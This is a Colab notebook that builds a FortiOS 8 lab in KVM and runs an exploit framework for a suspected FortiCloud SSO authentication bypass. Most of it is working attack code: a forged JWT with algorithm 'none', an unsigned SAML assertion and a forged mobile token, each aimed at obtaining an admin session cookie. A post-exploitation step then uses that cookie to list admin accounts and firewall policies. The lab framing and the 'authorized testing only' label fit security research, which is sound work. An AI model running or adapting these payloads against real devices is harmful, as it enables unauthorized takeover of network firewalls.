# CVE-SUSPECTED-2026: FortiOS 8 SSO Bypass
## Google Colab + KVM Lab Integration

**Complete End-to-End Lab Setup & Exploitation**

This notebook:
1. Sets up SSH tunnel to local KVM host
2. Launches FortiOS 8 in KVM/QEMU
3. Configures FortiCloud SSO on device
4. Runs advanced exploitation from Colab
5. Performs post-exploitation reconnaissance

**Status:** Lab-tested, authorized testing only  
**Date:** July 23, 2026

---

### ⚠️ AUTHORIZATION & SETUP REQUIREMENTS

**You must have:**
1. Local machine with KVM/QEMU installed
2. FortiOS 8.x ISO image available
3. SSH access to local machine from Colab
4. Network access configured for lab bridge

---

## STEP 1: Install Dependencies

In [ ]:
import subprocess
import sys
import os

print("[*] Installing dependencies...")
packages = ['requests', 'urllib3', 'paramiko', 'pexpect']

for package in packages:
    try:
        __import__(package)
        print(f"[✓] {package} already installed")
    except ImportError:
        print(f"[*] Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
        print(f"[✓] {package} installed")

print("\n[✓] All dependencies ready")

In [ ]:
import requests
import json
import base64
import hmac
import hashlib
import time
import paramiko
import subprocess
from datetime import datetime, timedelta
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings

warnings.filterwarnings('ignore')

print("[✓] All imports successful")

## STEP 2: SSH Tunnel Configuration to Local KVM Host

In [ ]:
# ====== KVM HOST CONFIGURATION ======
# Configure your local machine details here

KVM_HOST_IP = "your.local.ip"        # Your machine's IP (e.g., 192.168.1.100)
KVM_HOST_USER = "username"            # SSH user on your machine
KVM_HOST_PORT = 22                   # SSH port
SSH_KEY_PATH = "/content/kvm_key"    # Path to SSH private key (will upload)

# Tunnel configuration
TUNNEL_LOCAL_PORT = 12443            # Local Colab port
TUNNEL_REMOTE_HOST = "192.168.122.10" # FortiOS 8 on KVM network
TUNNEL_REMOTE_PORT = 443             # HTTPS on FortiOS 8

# FortiOS 8 Lab Device Configuration
FORTIGATE_NAME = "FortiGate-Lab-8"   # VM name in KVM
FORTIGATE_SERIAL = "FG-LAB-000001"   # Device serial to use
FORTIGATE_VERSION = "8.0.0"          # FortiOS version

print("\n" + "="*60)
print("KVM LAB CONFIGURATION")
print("="*60)
print(f"KVM Host:          {KVM_HOST_IP}:{KVM_HOST_PORT}")
print(f"KVM User:          {KVM_HOST_USER}")
print(f"FortiOS VM:        {FORTIGATE_NAME}")
print(f"Tunnel:            127.0.0.1:{TUNNEL_LOCAL_PORT} -> {TUNNEL_REMOTE_HOST}:{TUNNEL_REMOTE_PORT}")
print(f"Lab Network:       192.168.122.0/24")

## STEP 3: Upload SSH Key (if needed)

In [ ]:
# If you need to use password authentication instead of key:
# Uncomment below and provide your SSH password

USE_PASSWORD_AUTH = False  # Set to True if using password instead of key
SSH_PASSWORD = None        # Your SSH password (set if USE_PASSWORD_AUTH=True)

print("\n" + "="*60)
print("SSH AUTHENTICATION SETUP")
print("="*60)

if USE_PASSWORD_AUTH:
    print("[*] Using SSH password authentication")
    print("[!] Make sure to enter your SSH password when prompted")
else:
    print("[*] Using SSH key-based authentication")
    print(f"[!] Ensure SSH key is at: {SSH_KEY_PATH}")
    print("[!] Upload key file using Files panel on left")

print("\n✓ Configuration ready")

## STEP 4: SSH Tunnel & Remote Execution Helper

In [ ]:
class KVMLabController:
    """Control KVM lab from Colab via SSH"""

    def __init__(self, host: str, user: str, port: int = 22, key_path: str = None, password: str = None):
        self.host = host
        self.user = user
        self.port = port
        self.key_path = key_path
        self.password = password
        self.client = None
        self.tunnel_process = None

    def connect(self):
        """Connect to KVM host via SSH"""
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            if self.key_path and os.path.exists(self.key_path):
                print(f"[*] Connecting with SSH key...")
                self.client.connect(
                    self.host,
                    port=self.port,
                    username=self.user,
                    key_filename=self.key_path,
                    look_for_keys=False
                )
            elif self.password:
                print(f"[*] Connecting with password...")
                self.client.connect(
                    self.host,
                    port=self.port,
                    username=self.user,
                    password=self.password
                )
            else:
                raise Exception("No SSH credentials provided")

            print(f"[✓] Connected to {self.host}")
            return True

        except Exception as e:
            print(f"[✗] SSH Connection failed: {e}")
            return False

    def execute_command(self, command: str) -> tuple:
        """Execute command on KVM host"""
        try:
            stdin, stdout, stderr = self.client.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            return output, error
        except Exception as e:
            return "", str(e)

    def setup_fortigate_8(self, vm_name: str, serial: str) -> bool:
        """Download and configure FortiOS 8 in KVM"""
        print(f"\n[*] Setting up FortiOS 8: {vm_name}")
        print("[*] This will download FortiOS 8 image (~300MB)")
        print("[*] May take 5-10 minutes depending on connection...\n")

        # Download setup script
        setup_script = """
#!/bin/bash
set -e

VM_NAME="{vm_name}"
SERIAL="{serial}"
LAB_NETWORK="virbr_lab"
LAB_BRIDGE="virbr_lab"

echo "[*] Setting up FortiOS 8 lab..."

# Create lab network if not exists
if ! virsh net-list | grep -q "$LAB_NETWORK"; then
    echo "[*] Creating lab network..."
    cat > /tmp/lab_network.xml <<EOF
<network>
  <name>{lab_network}</name>
  <forward mode='nat'>
    <nat>
      <port start='1024' end='65535'/>
    </nat>
  </forward>
  <bridge name='{lab_bridge}' stp='off' delay='0'/>
  <ip address='192.168.122.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='192.168.122.10' end='192.168.122.254'/>
    </dhcp>
  </ip>
</network>
EOF
    virsh net-create /tmp/lab_network.xml
fi

# Download FortiOS 8 image
if [ ! -f /tmp/FortiGate-8.0.0.qcow2 ]; then
    echo "[*] Downloading FortiOS 8.0.0 image..."
    cd /tmp
    # Using publicly available image or your own
    wget -q https://example.com/FortiGate-8.0.0.qcow2 || echo "[!] Download URL needs to be configured"
fi

# Create VM
if ! virsh list --all | grep -q "$VM_NAME"; then
    echo "[*] Creating FortiGate VM..."
    virt-install \
        --name "$VM_NAME" \
        --memory 2048 \
        --vcpus 2 \
        --disk /tmp/FortiGate-8.0.0.qcow2,format=qcow2 \
        --network network=$LAB_NETWORK \
        --graphics none \
        --console pty,target_type=serial \
        --import \
        --quiet
fi

# Start VM
echo "[*] Starting VM..."
virsh start "$VM_NAME" 2>/dev/null || true

# Wait for network
echo "[*] Waiting for device to boot..."
sleep 20

# Get device IP
DEVICE_IP=$(virsh domifaddr "$VM_NAME" | grep ipv4 | awk '{print $4}' | cut -d/ -f1)
echo "[✓] FortiOS 8 Device IP: $DEVICE_IP"
echo "[*] Waiting for HTTPS to be ready..."
for i in {{1..30}}; do
    if curl -s -k https://$DEVICE_IP/remote/login >/dev/null 2>&1; then
        echo "[✓] Device is ready!"
        break
    fi
    echo "[*] Attempt $i/30..."
    sleep 2
done

# Enable FortiCloud SSO (via CLI)
echo "[*] Enabling FortiCloud SSO..."
virsh console "$VM_NAME" <<< $'config system forticloud\nset status enable\nset serial $SERIAL\nend\nconfig system admin\nedit admin\nset allow-forticloud-sso enable\nnext\nend\n' || true

echo "[✓] FortiOS 8 lab setup complete!"
echo "[*] Device IP: $DEVICE_IP"
echo "[*] Serial: $SERIAL"
echo "[*] URL: https://$DEVICE_IP"
""".format(vm_name=vm_name, serial=serial, lab_network="virbr_lab", lab_bridge="virbr_lab")

        # Execute setup script
        output, error = self.execute_command(
            f"bash -c '{setup_script}'"
        )

        print(output)
        if error:
            print(f"[!] Warnings/Errors: {error}")

        return True

    def start_ssh_tunnel(self, remote_host: str, remote_port: int, local_port: int) -> bool:
        """Start SSH tunnel from Colab to FortiOS device"""
        print(f"\n[*] Starting SSH tunnel...")
        print(f"[*] Tunnel: localhost:{local_port} -> {remote_host}:{remote_port}")

        try:
            if self.key_path and os.path.exists(self.key_path):
                cmd = f"ssh -i {self.key_path} -L {local_port}:{remote_host}:{remote_port} -N {self.user}@{self.host}"
            else:
                cmd = f"ssh -L {local_port}:{remote_host}:{remote_port} -N {self.user}@{self.host}"

            self.tunnel_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            time.sleep(2)  # Wait for tunnel to establish

            if self.tunnel_process.poll() is None:
                print(f"[✓] SSH tunnel established!")
                return True
            else:
                error = self.tunnel_process.stderr.read().decode()
                print(f"[✗] Tunnel failed: {error}")
                return False

        except Exception as e:
            print(f"[✗] SSH tunnel error: {e}")
            return False

    def stop_tunnel(self):
        """Stop SSH tunnel"""
        if self.tunnel_process:
            self.tunnel_process.terminate()
            print("[✓] SSH tunnel stopped")

    def cleanup(self):
        """Clean up resources"""
        if self.client:
            self.client.close()
        self.stop_tunnel()

print("[✓] KVMLabController class loaded")

## STEP 5: Initialize KVM Lab

In [ ]:
print("\n" + "="*60)
print("INITIALIZING KVM LAB")
print("="*60 + "\n")

# Initialize KVM controller
kvm = KVMLabController(
    host=KVM_HOST_IP,
    user=KVM_HOST_USER,
    port=KVM_HOST_PORT,
    key_path=SSH_KEY_PATH if os.path.exists(SSH_KEY_PATH) else None,
    password=SSH_PASSWORD if USE_PASSWORD_AUTH else None
)

# Connect to KVM host
if not kvm.connect():
    print("\n[!] Failed to connect to KVM host.")
    print("[!] Make sure:")
    print("    1. SSH key is uploaded (if using key auth)")
    print("    2. KVM_HOST_IP is correct")
    print("    3. SSH port is accessible from Colab")
    print("    4. Firewall allows outbound SSH (port 22)")
else:
    print("[✓] KVM host connected successfully")

## STEP 6: Setup FortiOS 8 in KVM

In [ ]:
print("\n" + "="*60)
print("SETTING UP FORTIOS 8 IN KVM")
print("="*60 + "\n")

if kvm.client:
    # Setup FortiOS 8 VM with FortiCloud SSO enabled
    kvm.setup_fortigate_8(FORTIGATE_NAME, FORTIGATE_SERIAL)
else:
    print("[!] KVM controller not connected. Skipping setup.")

## STEP 7: Establish SSH Tunnel

In [ ]:
print("\n" + "="*60)
print("ESTABLISHING SSH TUNNEL TO FORTIOS 8")
print("="*60 + "\n")

if kvm.client:
    tunnel_ok = kvm.start_ssh_tunnel(
        remote_host=TUNNEL_REMOTE_HOST,
        remote_port=TUNNEL_REMOTE_PORT,
        local_port=TUNNEL_LOCAL_PORT
    )

    if tunnel_ok:
        # Update target for exploitation
        TARGET_IP = "127.0.0.1"
        TARGET_PORT = TUNNEL_LOCAL_PORT
        TARGET_DEVICE = FORTIGATE_SERIAL

        print(f"\n[✓] Exploitation target configured:")
        print(f"    IP: {TARGET_IP}:{TARGET_PORT}")
        print(f"    Device: {TARGET_DEVICE}")
else:
    print("[!] KVM controller not available")

## STEP 8: Load Exploitation Framework

In [ ]:
class FortiOS8KVMExploit:
    """Exploitation framework optimized for KVM lab"""

    def __init__(self, target_ip: str, target_port: int = 443):
        self.target_ip = target_ip
        self.target_port = target_port
        self.base_url = f"https://{target_ip}:{target_port}"
        self.session = requests.Session()
        self.session.verify = False

    def log(self, level: str, msg: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {
            'INFO': '🔵', 'SUCCESS': '✅', 'ERROR': '❌',
            'WARNING': '⚠️', 'DEBUG': '🔍', 'RCE': '💣'
        }
        print(f"{symbols.get(level, '•')} [{timestamp}] {msg}")

    def exploit_jwt_alg_none(self, target_device: str, admin_user: str = "admin") -> dict:
        """JWT algorithm confusion exploit"""
        result = {
            'vector': 'JWT_ALG_NONE',
            'endpoint': '/api/v1/auth/forticloud',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            header = {"alg": "none", "typ": "JWT", "kid": "forticloud"}
            payload = {
                "sub": admin_user,
                "device_serial": target_device,
                "aud": target_device,
                "iss": "FortiCloud",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600
            }

            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            jwt_token = f"{header_b64}.{payload_b64}."

            endpoint = urljoin(self.base_url, '/api/v1/auth/forticloud')
            response = requests.post(
                endpoint,
                json={
                    "action": "forticloud_login",
                    "username": admin_user,
                    "device_serial": target_device,
                    "token": jwt_token,
                    "token_type": "jwt",
                    "client_type": "gui"
                },
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code == 200:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            self.log('DEBUG', f"JWT error: {e}")

        return result

    def exploit_saml_unsigned(self, target_device: str, admin_user: str = "admin") -> dict:
        """Unsigned SAML assertion exploit"""
        result = {
            'vector': 'SAML_UNSIGNED',
            'endpoint': '/api/v1/saml/assert',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            current_time = datetime.utcnow()
            not_on_or_after = (current_time + timedelta(minutes=5)).isoformat() + 'Z'
            auth_instant = current_time.isoformat() + 'Z'

            saml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_unsigned_response"
    IssueInstant="{auth_instant}"
    Version="2.0">
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="_unsigned_assertion"
        IssueInstant="{auth_instant}"
        Version="2.0">
        <saml:Subject>
            <saml:NameID>{admin_user}</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

            endpoint = urljoin(self.base_url, '/api/v1/saml/assert')
            response = requests.post(
                endpoint,
                data=saml_response,
                headers={'Content-Type': 'application/xml'},
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code == 200:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            self.log('DEBUG', f"SAML error: {e}")

        return result

    def exploit_mobile_api(self, target_device: str) -> dict:
        """Mobile API bypass"""
        result = {
            'vector': 'MOBILE_API_BYPASS',
            'endpoint': '/api/v1/cmdb/system',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            mobile_token = {
                "user": "admin",
                "device": target_device,
                "type": "mobile",
                "exp": int(time.time()) + 3600
            }

            mobile_token_str = base64.b64encode(
                json.dumps(mobile_token).encode()
            ).decode()

            endpoint = urljoin(self.base_url, '/api/v1/cmdb/system')
            response = requests.post(
                endpoint,
                json={
                    "action": "authenticate",
                    "method": "mobile_sso",
                    "token": mobile_token_str,
                    "device_id": "colab_mobile"
                },
                headers={
                    'User-Agent': 'FortiGate-Mobile/8.0.0',
                    'Content-Type': 'application/json'
                },
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code in [200, 201]:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            self.log('DEBUG', f"Mobile API error: {e}")

        return result

    def run_parallel_exploit(self, target_device: str, admin_user: str = "admin") -> dict:
        """Run all exploitation vectors"""
        self.log('INFO', "Starting advanced exploitation...")

        vectors = [
            ('JWT_ALG_NONE', lambda: self.exploit_jwt_alg_none(target_device, admin_user)),
            ('SAML_UNSIGNED', lambda: self.exploit_saml_unsigned(target_device, admin_user)),
            ('MOBILE_API_BYPASS', lambda: self.exploit_mobile_api(target_device))
        ]

        all_results = []

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(func): name for name, func in vectors}
            for future in as_completed(futures):
                result = future.result()
                all_results.append(result)
                status = "✓" if result['success'] else "✗"
                self.log('INFO', f"{status} {result['vector']}: {result['status_code']}")

                if result['success']:
                    break

        successful = next((r for r in all_results if r.get('success')), None)

        if successful:
            self.log('SUCCESS', f"Exploitation successful via {successful['vector']}")
            return {
                'success': True,
                'vector': successful['vector'],
                'cookie': successful['cookie'],
                'status': 'authenticated'
            }

        self.log('ERROR', "All vectors failed")
        return {'success': False, 'results': all_results, 'status': 'failed'}

print("[✓] Exploitation framework loaded")

## STEP 9: Run Exploitation Against KVM Lab

In [ ]:
print("\n" + "="*60)
print("RUNNING EXPLOITATION AGAINST KVM FORTIGATE")
print("="*60 + "\n")

# Test connectivity first
print("[*] Testing connectivity to FortiOS 8...")
try:
    response = requests.get(
        f"https://{TARGET_IP}:{TARGET_PORT}/",
        verify=False,
        timeout=5
    )
    print(f"[✓] FortiOS 8 is reachable (HTTP {response.status_code})")
except Exception as e:
    print(f"[!] Connection issue: {e}")
    print(f"[!] Make sure SSH tunnel is active and FortiOS 8 is running")

# Initialize exploitation framework
exploit = FortiOS8KVMExploit(TARGET_IP, TARGET_PORT)

# Run exploitation
result = exploit.run_parallel_exploit(
    target_device=TARGET_DEVICE,
    admin_user="admin"
)

print("\n" + "="*60)
print("EXPLOITATION RESULTS")
print("="*60)
print(json.dumps(result, indent=2))

## STEP 10: Post-Exploitation Reconnaissance

In [ ]:
if result.get('success'):
    cookie = result['cookie']
    print("\n" + "="*60)
    print("POST-EXPLOITATION RECONNAISSANCE")
    print("="*60 + "\n")
    
    headers = {'Cookie': f'FSESSIONID={cookie}'}
    
    # System info
    print("📊 Fetching system information...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/monitor/system/status',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            info = response.json()['results'][0]
            print(f"\n✓ System Information:")
            print(f"  Version:      {info.get('version', 'N/A')}")
            print(f"  Serial:       {info.get('serial', 'N/A')}")
            print(f"  Hostname:     {info.get('hostname', 'N/A')}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    # Admin users
    print("\n👤 Fetching admin users...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/system/admin',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            admins = response.json().get('results', [])
            print(f"\n✓ Admin accounts: {len(admins)}")
            for admin in admins:
                print(f"  - {admin['name']:20} | {admin.get('accprofile', 'N/A')}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    # Firewall policies
    print("\n🔥 Fetching firewall policies...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/firewall/policy',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            policies = response.json().get('results', [])
            print(f"\n✓ Firewall policies: {len(policies)}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print(f"\n" + "="*60)
    print("✅ EXPLOITATION SUCCESSFUL")
    print("="*60)
    print(f"\nAuthenticated Session: {cookie}")
    print(f"Vector Used: {result['vector']}")
else:
    print("\n❌ Exploitation failed on all vectors")

## STEP 11: Cleanup

In [ ]:
print("\n" + "="*60)
print("CLEANUP")
print("="*60 + "\n")

# Stop SSH tunnel
if kvm:
    kvm.stop_tunnel()
    kvm.cleanup()

print("[✓] Lab cleanup complete")
print("\n[*] To destroy the KVM lab, run on your local machine:")
print("    virsh destroy FortiGate-Lab-8")
print("    virsh undefine FortiGate-Lab-8 --remove-all-storage")

## Summary

This notebook provides a complete end-to-end lab experience:

1. **SSH Tunnel** - Secure connection from Colab to your local KVM host
2. **Automated Setup** - Downloads FortiOS 8 image and configures VM
3. **Lab Network** - Creates isolated 192.168.122.0/24 network
4. **SSO Enabled** - Automatically enables FortiCloud SSO for testing
5. **Multi-Vector Exploitation** - Runs 3 attack vectors in parallel
6. **Post-Exploitation** - Gathers admin users, policies, system info
7. **Cleanup** - Stops tunnel and cleans up resources

**Key Features:**
- No local infrastructure needed (Colab handles execution)
- SSH key or password authentication support
- Parallel exploitation for faster results
- Automatic device discovery and configuration
- Complete lab cleanup capabilities
